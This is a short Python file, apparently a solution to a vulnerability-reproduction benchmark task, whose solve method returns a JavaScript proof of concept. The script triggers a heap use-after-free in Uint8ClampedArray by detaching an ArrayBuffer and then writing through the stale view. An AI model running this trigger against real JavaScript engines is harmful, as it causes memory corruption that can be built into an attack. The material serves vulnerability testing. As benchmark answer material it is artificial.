import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in Uint8ClampedArray.
        # In the vulnerable version, Uint8ClampedArray is a separate class that does not
        # inherit from TypedArray and fails to check if the underlying ArrayBuffer is detached.
        # Triggering the UAF involves:
        # 1. Allocating an ArrayBuffer
        # 2. Creating a Uint8ClampedArray view on it
        # 3. Detaching the ArrayBuffer (freeing the backing store)
        # 4. Accessing the Uint8ClampedArray (using the dangling pointer)

        poc_code = (
            b"var buffer = new ArrayBuffer(0x100);\n"
            b"var view = new Uint8ClampedArray(buffer);\n"
            b"\n"
            b"// Attempt to detach the buffer using common shell functions or standard APIs\n"
            b"if (typeof detachArrayBuffer === 'function') {\n"
            b"    detachArrayBuffer(buffer);\n"
            b"} else {\n"
            b"    try {\n"
            b"        structuredClone(buffer, { transfer: [buffer] });\n"
            b"    } catch (e) {}\n"
            b"}\n"
            b"\n"
            b"// Accessing the view after the buffer is detached triggers the UAF\n"
            b"view[0] = 0x41;\n"
        )
        return poc_code
